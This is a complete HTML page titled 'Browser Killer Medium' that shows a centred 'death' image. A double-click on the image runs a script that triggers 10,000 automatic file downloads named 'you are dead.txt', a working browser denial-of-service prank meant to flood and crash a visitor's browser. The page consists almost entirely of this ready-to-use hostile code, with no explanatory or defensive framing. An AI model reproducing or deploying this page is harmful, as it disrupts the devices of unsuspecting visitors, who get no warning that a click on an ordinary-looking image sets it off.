<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Browser Killer Medium</title>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0"
    />
  </head>
  <body>
    <img
      ondblclick="kill()"
      id="death"
      src="https://cdn.discordapp.com/attachments/755816680625799239/761218890860593223/009-death.png"
      alt="death"
    />
  </body>
  <script>
    async function downloadAsFile(data) {
      let a = document.createElement("a");
      let file = new Blob([data], { type: "text/txt" });
      a.href = URL.createObjectURL(file);
      a.download = "you are dead.txt";
      a.click();
    }
    function kill() {
      for (let i = 0; i < 10000; i++) {
        downloadAsFile("Goodbye!");
      }
    }
  </script>
  <style>
      :root {
    	--width: 30vw;
      --height: 30vw;
    }

    #death {
      position: absolute;
      top: calc(50vh - var(--height) / 2);
      left: calc(50vw - var(--width) / 2);
    	width: var(--width);
      height: var(--height);
    }
  </style>
</html>
